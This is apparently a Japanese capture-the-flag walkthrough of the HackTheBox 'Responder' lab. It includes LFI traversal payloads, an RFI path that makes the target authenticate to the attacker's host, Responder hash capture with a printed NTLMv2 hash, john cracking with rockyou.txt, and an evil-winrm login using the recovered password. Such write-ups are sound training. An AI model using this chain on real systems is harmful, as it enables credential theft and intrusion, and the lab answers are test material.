# Starting point Tier2 : Responder

# Task1

IPアドレスを使用してブラウザからアクセスを試みると、unika.htbにリダイレクトされた

# Task2

burpsuiteを起動してログを監視したところ、該当サイトにアクセスした際のレスポンスはX-Powerd-By: PHP/8.1.1と表示されていた

ans. php

# Task3

unika.htbのサーバの名前解決ができないようだったので、これを解決する。  
`echo "[ipaddr]  unika.htb" | sudo tee -a /etc/hosts`  
でDNSの対応をローカルのhostsに対して追加することで、正しくアクセスすることができるようになる。  

unika.htbのナビゲーションバー右端、言語設定をENからFRに変更すると、index.php?page=french.htmlとGETメソッドでindex.phpに対してパラメータを投げているのがわかる。  

ans. page

# Task4

../../../../../../../../windows/system32/drivers/etc/hosts  

LFI(Local File Include)はディレクトリトラバーサル攻撃とほぼ同じ攻撃で、サーバに存在するファイルが外部から不正に閲覧できるなどの点で共通している。異なるのはサーバ側でどのような実装がされているかで、ファイル実行まで可能な場合はLFI、閲覧のみの場合はディレクトリトラバーサルと分類される。  

# Task5

//10.10.14.6/somefile  

RFI(Remote File Include)は、リモート上に存在するファイルを読み込ませ、実行させることで不正な動作を引き起こすことができるという脆弱性。//から始まっているのでリモートを見ているのがわかる。  

# Task6

New Technology LAN Manager

Googlingが解決する。現在はKerberosに代替されている。  
パスワードハッシュを用いたチャレンジレスポンス方式のネットワーク認証プロトコル。

# Task7

Responderというツールについての問題  
ネットワークインターフェースを指定するのは-Iフラグ

# Task8

John the ripper  

通称John、ハッシュクラッキングツールの名前についての出題  

# Task9

まずはresponderを使用してハッシュを取得する。  

`sudo responder -I tun0`でtun0インターフェースに入ってくる情報を抜けるように張っておく。  
responderはハイジャック攻撃ツールで、セッションのLLMNRリクエストなどを監視し偽の応答を返すことで、サーバに成りすますことが可能となる。今回はSMB  
`unika.htb/index.php?page=//[my_ipaddr]/wherever`のように、自分のデバイスのipaddrに対して何でもいいのでアクセスを要求させることで、相手のサーバがAdminとしてアクセスしようとすることを利用してそのパスワードのハッシュを獲得できる。
```none
[SMB] NTLMv2-SSP Client   : 10.129.141.18
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1ac2b6d4948a9ec6:02E273C8683E38D2E76861F148AB4EFF:010100000000000080C24B60F657DA01ABCA76A96DF97FBB0000000002000800470050005600440001001E00570049004E002D00430046004A00340031003400370035004A003400550004003400570049004E002D00430046004A00340031003400370035004A00340055002E0047005000560044002E004C004F00430041004C000300140047005000560044002E004C004F00430041004C000500140047005000560044002E004C004F00430041004C000700080080C24B60F657DA01060004000200000008003000300000000000000001000000002000003423E338EF44CC4C5D1FF5974B9DEB08221C3D3E12DCF7B4E18EC67C63330B9E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100370036000000000000000000
```
こんな感じの出力が得られていれば成功。  
このhashを、johnを使ってクラックすればフラグが得られる。  

kali linuxにはよく使われるパスワードリストが最初から用意されているので、`/usr/share/wordlists/`ディレクトリ内に置かれているリストの中から適切なリスト、今回はrockyou.txtをワードリストとして指定し、`john hash.txt -w=/usr/share/wordlists/rockyou.txt`とすればヒットするものがあった。  

ans. badminton

# Task10

範囲広めでNmapすればよし

ans. 5985

# Task11

`evil-winrm`コマンドでWindows Remote Machineサービスのセッションを構築できる。  
`evil-winrm -i [target_ipaddr] -u administrator -p badminton`でセッションを構築、その後内部を動き回り`C:\Users\mike\Desktop\flag.txt`を発見、これをcatして回答すれば完了  
findコマンドを使用してflagというキーワードによって発見する方法もある  
